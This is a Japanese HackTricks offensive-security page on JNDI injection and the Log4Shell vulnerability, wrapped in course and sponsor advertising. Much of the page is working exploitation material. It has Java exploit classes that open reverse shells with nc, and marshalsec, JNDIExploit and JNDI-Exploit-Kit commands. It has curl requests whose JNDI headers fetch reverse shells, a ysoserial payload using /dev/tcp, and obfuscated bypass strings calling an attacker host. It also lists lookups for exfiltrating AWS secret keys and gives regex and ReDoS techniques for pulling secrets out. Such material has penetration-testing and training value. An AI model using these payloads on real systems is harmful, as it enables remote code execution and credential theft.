```markdown
# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリ、クラウドシステムまでのテクノロジースタック全体にわたる問題を見つけて、より早く修正できるようにします。今日[**無料で試してみてください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 基本情報

JNDIは1990年代後半からJavaに存在しています。これは、名前サービスを使用してディレクトリを介してデータを見つけることを**可能にするディレクトリサービス**です。名前サービスは値（バインディング）を関連付けるため、ディレクトリ内の参照を通じて取得することができます。

JNDIには、さまざまなディレクトリサービスを使用するための**サービスプロバイダインターフェース**（SPI）が多数あります。JNDIの目的は、他のシステムから非常に簡単にデータを取得することです。リモートでJavaオブジェクトを取得することさえできますが、ここに問題が発生します。

例えば、**CORBA COS**（Common Object Service）、**Java RMI**（Remote Method Interface）レジストリ、**LDAP**用のSPIが存在します。

![](<../../.gitbook/assets/image (627).png>)

### JNDIネーミングリファレンス

Javaオブジェクトを取得するためには、それらをシリアライズしてバイナリ表現を保存することができます。しかし、これが機能しないケースもあります（データが大きすぎるなどの理由で）。\
Javaオブジェクトをより簡単に保存するために、**ネーミングリファレンスが使用されます**。\
ネーミングリファレンスには2種類あります：

* **リファレンスアドレス**：オブジェクトのアドレス（_rmi://server/ref_）を示し、**そのアドレスからオブジェクトが取得されます**。
* **リモートファクトリ**：この場合、JNDIリファレンスに**リモートファクトリクラス**が指定され、JNDIアドレスに従ってリモートクラスがリモートファクトリから取得され、**クラスがダウンロードされロードされます**。

これは危険です。なぜなら、**攻撃者がシステムに任意のオブジェクトをロードさせ、任意のコードを実行させる可能性がある**からです。したがって、いくつかの保護措置が存在します：

* **RMI**：`java.rmi.server.useCodeabseOnly = true`は、**JDK 7u21**以降のデフォルトであり、カスタムJavaオブジェクトをリモートでロードすることを許可しません。さらに、保護が無効になっていても、ロードできる内容を設定する**セキュリティマネージャ**が強制されます。
* **LDAP**：`com.sun.jndi.ldap.object.trustURLCodebase = false`は、**JDK 6u141, 7u131, 8u121**以降のデフォルトであり、任意のJavaオブジェクトのダウンロードを実行することは許可されません。しかし、これが`true`に設定されている場合は実行され、**セキュリティマネージャは強制されません**。
* **CORBA**：設定するプロパティはありませんが、**セキュリティマネージャは常に強制されます**。

さらに、JNDIリンクに従う**ネーミングマネージャ**には、セキュリティマネージャや設定するプロパティがないため、常にオブジェクトを取得しようとします。

ご覧のとおり、**一般的な保護は十分ではありません**。なぜなら、ランダムなアドレスからJNDIをロードすることに対する**保護がなく**、RMI、LDAP、CORBAの保護は、設定によっては、**任意のJavaオブジェクトをロードする**ため、またはアプリケーションに存在するコンポーネントを悪用して、**任意のコードを実行するガジェットとしてJavaオブジェクトをロードする**ためにバイパスされる可能性があります。

JNDIを悪用するURLの例：

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### JNDI例

![](<../../.gitbook/assets/image (655) (1) (1).png>)

**`PROVIDER_URL`**を設定していても、異なるURLをlookupで指定することができ、アクセスされます：`ctx.lookup("<attacker-controlled-url>")`。これが攻撃者がシステムから任意のオブジェクトをロードするために悪用するものです。

### CORBA

**Interoperable Object Reference (IOR)** は、リモートCORBAサーバー上のオブジェクトを一意に識別するCORBAまたはRMI-IIOPリファレンスです。IORはバイナリ形式またはバイナリの文字列16進表現であることができます。\
その他の情報の中で、**Type ID**（インターフェースの一意の識別子）と**Codebase**（スタブクラスを取得するためのリモートロケーション）を含んでいます。\
CORBAは**デフォルトでは悪用できない**ことに注意してください。\
それには以下が必要です：

* **セキュリティマネージャがインストールされている必要があります**
* セキュリティマネージャによって攻撃者が制御する**codebaseへの接続が許可されている必要があります**。これを許可する方法はいくつかあります：
  * ソケット権限：`permissions java.net.SocketPermission "*:1098-1099", "connect";`
  * すべてのファイルを読むことを許可するファイル権限：`permission java.io.FilePermission "<<ALL FILES>>", "read";`
  * 攻撃者がエクスプロイト（クラスまたはzipアーカイブ）をアップロードできるフォルダーを読むためのファイル権限

デフォルトでこれを許可する**ベンダーのポリシーが見つかるかもしれません**。

### RMI

前述の**JNDIネーミングリファレンスセクションで指摘されたように、RMIはデフォルトでは任意のJavaクラスをダウンロードすることは許可されません**。さらに、許可されていたとしても、**セキュリティマネージャのポリシーをバイパスする必要があります**（前のセクションで、これがCORBAで可能であることを学びました）。

### LDAP

まず、検索とルックアップを区別する必要があります。\
**検索**は`ldap://localhost:389/o=JNDITutorial`のようなURLを使用してLDAPサーバーからJNDITutorialオブジェクトを見つけ、**その属性を取得します**。\
**ルックアップ**は、名前にバインドされている**何でも取得したい**ときに使用される**ネーミングサービス**のためのものです。

LDAP検索が**SearchControls.setReturningObjFlag()を`true`で呼び出された場合、返されるオブジェクトは再構築されます**。

したがって、これらのオプションを攻撃する方法はいくつかあります。\
**攻撃者はLDAPレコードにペイロードを注入して、それらを収集するシステムで実行される**可能性があります（LDAPサーバーにアクセスできれば、数十台のマシンを侵害するのに非常に有用です）。この攻撃を行う別の方法は、例えばLDAP検索で**MitM攻撃を実行する**ことです。

アプリが**JNDI LDAP URLを解決するようにすることができれば**、検索されるLDAPを制御でき、エクスプロイト（log4shell）を送り返すことができます。

#### デシリアライゼーションエクスプロイト

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**エクスプロイトはシリアライズされ**、デシリアライズされます。\
`trustURLCodebase`が`true`の場合、攻撃者は自分のクラスをcodebaseに提供できます。そうでない場合は、クラスパス内のガジェットを悪用する必要があります。

#### JNDIリファレンスエクスプロイト

**JavaFactoryリファレンスを使用して**このLDAPを攻撃する方が簡単です：

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shell脆弱性

この脆弱性はLog4jに導入されており、`${prefix:name}`の形式で[**特別な構文**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)をサポートしています。ここで`prefix`は[**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html)の中のさまざまなものの1つであり、`name`は評価されるべきです。例えば、`${java:version}`は現在実行中のJavaのバージョンです。

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)では、次のように`jndi` Lookupが追加されました："JndiLookupを使用すると、JNDIを介して変数を取得できます。デフォルトではキーはjava:comp/env/でプレフィックスが付けられますが、キーに**":"が含まれている場合はプレフィックスは追加されません**。"

キーに**":"が含まれている**場合、`${jndi:ldap://example.com/a}`のように、**プレフィックスはなく**、**LDAPサーバーにオブジェクトが問い合わせられます**。そして、これらのLookupsはLog4jの設定だけでなく、ログが記録されるときにも使用できます。

したがって、RCEを取得するために必要なのは、**ユーザーが制御する情報を処理する脆弱なバージョンのLog4j**です。そして、Javaアプリケーションが情報をログに記録するために広く使用されているライブラリであるため（インターネットに面したアプリケーションを含む）、例えばUser-Agentのような受信HTTPヘッダーをログに記録することが非常に一般的でした。ただし、log4jはHTTP情報だけでなく、開発者が指定した**任意の入力やデータをログに記録するために使用されます**。

## Log4Shell CVE

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**: 元の'Log4Shell'脆弱性は、[信頼できないデシリアライゼーション](https://cwe.mitre.org/data/definitions/502.html)の欠陥です。重大度でクリティカルと評価され、この脆弱性は[CVSS](https://www.first.org/cvss/)スケールで10をスコアし、**認証されていない攻撃者にリモートコード実行（RCE）能力を付与し**、システムの完全な乗っ取りを可能にします。\
\
11月24日にAlibaba Cloud Security TeamのChen ZhaojunがApache
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **検証**

前に挙げたプラットフォームのいくつかは、リクエストされたときにログに記録される変数データを挿入することを許可します。\
これは2つのことに非常に役立ちます：

* 脆弱性を**検証**するため
* 脆弱性を悪用して情報を**抽出**するため

例えば、次のようなリクエストをすることができます：\
または `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** そして、**環境変数の値を含むDNSリクエストが受信された場合**、アプリケーションが脆弱であることがわかります。

抽出しようとする他の情報：
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE 情報

{% hint style="info" %}
**JDKのバージョンが6u141、7u131、8u121より高いホストは、LDAPクラスローディング**ベクターに対して保護されますが、**逆シリアライズベクターに対しては保護されません**。これは、`com.sun.jndi.ldap.object.trustURLCodebase`がデフォルトで無効になっているため、JNDIはLDAPを使用してリモートコードベースをロードできないからです。しかし、逆シリアライズと変数の漏洩はまだ可能であることを強調する必要があります。
これは、**言及されたバージョンを悪用する**ためには、Javaアプリケーション上に存在する**信頼できるガジェットを悪用する**必要があることを意味します（例えばysoserialやJNDIExploitを使用）。しかし、より低いバージョンを悪用する場合、任意のクラスをロードして実行させることができます（これにより攻撃が容易になります）。

**詳細情報**（RMIやCORBAベクターの制限事項など）については、前のJNDI Naming Referenceセクションを**確認するか**、[https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)をご覧ください。
{% endhint %}

### RCE - Marshalsecを使ったカスタムペイロード

_このトリックは完全に**THM box**から取られています:_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)___

このエクスプロイトでは、ツール[**marshalsec**](https://github.com/mbechler/marshalsec)（[**ここからjarバージョンをダウンロード**](https://github.com/RandomRobbieBF/marshalsec-jar)）を使用して、LDAPリファラルサーバーを作成し、接続をセカンダリHTTPサーバーにリダイレクトして、そこでエクスプロイトが提供されます：
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc -e /bin/sh attacker_ip 4444");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
{% endcode %}

被害者にリバースシェルを送信するコードをロードさせるために、Exploit.javaという名前のJavaファイルを作成できます。上記の内容を含めます。
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

**クラスファイル**を作成するには、`javac Exploit.java -source 8 -target 8` を実行し、その後、クラスファイルが作成された同じディレクトリで **HTTPサーバー** を起動します: `python3 -m http.server`。\
**marshalsecのLDAPサーバーは、このHTTPサーバーを指している必要があります**。\
その後、以下のようなペイロードを送信することで、**脆弱なウェブサーバーにエクスプロイトクラスを実行させる**ことができます:
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
_以下の点に注意してください。JavaがLDAPを使用してリモートコードベースをロードするように設定されていない場合、このカスタムエクスプロイトは機能しません。その場合、信頼できるクラスを悪用して任意のコードを実行する必要があります。_

### RCE - **JNDIExploit**

{% hint style="info" %}
log4shellの発見後、何らかの理由で作者がこのプロジェクトをgithubから削除したことに注意してください。キャッシュされたバージョンは[https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2](https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2)で見つけることができますが、作者の決定を尊重したい場合は、この脆弱性を悪用するために別の方法を使用してください。

さらに、wayback machineではソースコードを見つけることができないので、ソースコードを分析するか、実行している内容がわからないjarを実行するかのどちらかです。
{% endhint %}

この例では、ポート8080でこの**log4shellに脆弱なウェブサーバー**を実行するだけです：[https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_READMEに実行方法が記載されています_)。この脆弱なアプリは、HTTPリクエストヘッダー _X-Api-Version_ の内容を脆弱なバージョンのlog4shellでログ記録しています。

次に、**JNDIExploit** jarファイルをダウンロードして、以下のコマンドで実行できます：
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
コードを数分間読んだ後、_com.feihong.ldap.LdapServer_ と _com.feihong.ldap.HTTPServer_ で、**LDAP と HTTP サーバーがどのように作成されるか**がわかります。LDAP サーバーは提供する必要があるペイロードを理解し、被害者を HTTP サーバーにリダイレクトします。HTTP サーバーはエクスプロイトを提供します。
_com.feihong.ldap.gadgets_ では、望ましいアクションを実行するために使用できる**いくつかの特定のガジェット**を見つけることができます（潜在的に任意のコードを実行します）。そして、_com.feihong.ldap.template_ では、**エクスプロイトを生成する**さまざまなテンプレートクラスを見ることができます。

利用可能なエクスプロイトは **`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`** で確認できます。いくつかの便利なものは次のとおりです：
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
したがって、例では、すでにそのdocker脆弱性アプリが実行されています。攻撃するには：
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
攻撃を送信すると、**JNDIExploit-1.2-SNAPSHOT.jar** を実行したターミナルに出力が表示されます。

**他のエクスプロイトオプションについては、`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u` を確認してください。さらに、必要に応じて、LDAPおよびHTTPサーバーのポートを変更することができます。**

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

前のエクスプロイトと同様に、[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) を使用してこの脆弱性を悪用することができます。\
被害者に送信するURLを生成するには、次のコマンドを実行します：
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_この攻撃はカスタム生成されたJavaオブジェクトを使用して、**THM solar room**のようなラボで機能します。しかし、通常は機能しません（デフォルトではJavaはLDAPを使用してリモートコードベースをロードするように設定されていないためです）。信頼されたクラスを悪用して任意のコードを実行するわけではないからだと思います。_

### RCE - ysoserial & JNDI-Exploit-Kit

このオプションは、**特定のクラスのみを信頼し、すべてのクラスを信頼しないように設定されたJavaバージョン**を攻撃するのに非常に有用です。したがって、**ysoserial**を使用して、**任意のコードを実行するために使用できる信頼されたクラスのシリアライゼーション**を生成します（_攻撃が機能するためには、被害者のJavaプログラムがysoserialによって悪用される信頼されたクラスを使用している必要があります_）。

**ysoserial**または[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)を使用して、JNDIによってダウンロードされるデシリアライゼーションのエクスプロイトを作成できます：
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit) を使用して、脆弱なマシンからの接続を待つ **JNDIリンク** を生成します。JNDI-Exploit-Kitによって**自動的に生成される異なるエクスプロイト**や、あなた自身の**デシリアライゼーションペイロード**（あなたが生成するか、ysoserialによって生成される）をサーバーに提供できます。
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

生成されたJNDIリンクを使用して、脆弱なバージョンのlog4jに対して**`${ldap://10.10.14.10:1389/generated}`** を送信するだけで、簡単に脆弱性を悪用し、**リバースシェル**を取得できます。

### バイパス
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### 自動スキャナー

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - ローカルの脆弱なライブラリを見つける

### テスト用ラボ

* [**LogForge HTB マシン**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar ルーム**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell 悪用

この [**CTF レポート**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) では、**Log4J** のいくつかの機能を**悪用**する可能性が非常によく説明されています。

Log4j の [**セキュリティページ**](https://logging.apache.org/log4j/2.x/security.html) には興味深い文章があります：

> バージョン 2.16.0（Java 8用）から、**メッセージルックアップ機能は完全に削除されました**。**設定内のルックアップは引き続き機能します**。さらに、Log4j はデフォルトで JNDI へのアクセスを無効にします。設定内の JNDI ルックアップは、明示的に有効にする必要があります。

> バージョン 2.17.0 から（および Java 7 と Java 6 用の 2.12.3 と 2.3.1）、**設定内のルックアップ文字列のみが再帰的に展開されます**。他の使用法では、トップレベルのルックアップのみが解決され、ネストされたルックアップは解決されません。

これは、デフォルトでは任意の `jndi` エクスプロイトを**使用することを忘れる**ことを意味します。さらに、**再帰的なルックアップ**を実行するには、それらを設定する必要があります。

例えば、その CTF では log4j2.xml ファイルに次のように設定されていました：
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

このCTFでは攻撃者は`${sys:cmd}`の値を制御し、環境変数からフラグを抜き出す必要がありました。\
[**以前のペイロード**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)のページで見たように、環境変数にアクセスする方法にはいくつかあります。例えば：**`${env:FLAG}`**。このCTFではこれは役に立ちませんでしたが、他の実際のシナリオでは役立つかもしれません。

### 例外によるデータ抜き出し

CTFでは、log4Jを使用するJavaアプリケーションのstderrにアクセスすることは**できませんでした**が、Log4Jの**例外はstdoutに送られ**、Pythonアプリで表示されました。これは、例外をトリガーすることで内容にアクセスできることを意味していました。フラグを抜き出すための例外は次のようになります：**`${java:${env:FLAG}}`.** これは**`${java:CTF{blahblah}}`**が存在しないため、フラグの値を含む例外が表示されるためです：

![](<../../.gitbook/assets/image (157).png>)

### 変換パターン例外

言及するだけですが、新しい[**変換パターン**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)を注入し、`stdout`にログされる例外をトリガーすることもできます。例えば：

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

この方法は、ルックアップが変換パターンの前に解決されなかったため、エラーメッセージ内のデータを抜き出すのには役立ちませんでしたが、検出など他のことには役立つかもしれません。

### 変換パターン正規表現

しかし、正規表現をサポートするいくつかの**変換パターン**を使用して、正規表現を使用し、**バイナリサーチ**または**時間ベース**の動作を悪用することで、ルックアップから情報を抜き出すことが可能です。

* **例外メッセージを通じたバイナリサーチ**

変換パターンの**`%replace`**は、**文字列**から**内容**を**置換**するために、**正規表現**を使用して**置換**することができます。次のように機能します：`replace{pattern}{regex}{substitution}`\
この振る舞いを悪用して、文字列内の何かに正規表現が**マッチした場合に例外をトリガー**し、見つからなかった場合には例外が発生しないようにすることができます：
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **時間ベース**

前のセクションで述べたように、**`%replace`** は **正規表現**をサポートしています。したがって、フラグが見つかった場合に **タイムアウト** を引き起こすために、[**ReDoSページ**](../regular-expression-denial-of-service-redos.md)からのペイロードを使用することが可能です。\
例えば、`%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` のようなペイロードは、そのCTFで **タイムアウト** を引き起こします。

この [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) では、ReDoS攻撃の代わりに **増幅攻撃** を使用して応答に時間差を生じさせました：

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> もしフラグが `flagGuess` で始まる場合、フラグ全体が29個の `#` に置き換えられます（フラグの一部ではないであろうこの文字を使用しました）。**結果として得られる29個の `#` はそれぞれ54個の `#` に置き換えられます**。このプロセスは **6回繰り返され**、合計で `29*54*54^6* =`` `` `**`96816014208`  `#` です！**
>
> これだけ多くの `#` を置き換えると、Flaskアプリケーションの10秒のタイムアウトが引き起こされ、結果としてHTTPステータスコード500がユーザーに送信されます。（もしフラグが `flagGuess` で始まらない場合、500以外のステータスコードを受け取ります）

## 参考文献

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

より重要な脆弱性を素早く見つけて修正する。Intruderは攻撃面を追跡し、積極的な脅威スキャンを実行し、APIからウェブアプリ、クラウドシステムまでの技術スタック全体で問題を見つけ出します。今日[**無料で試す**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい**、または **HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や [**telegramグループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングトリックを共有する。

</details>
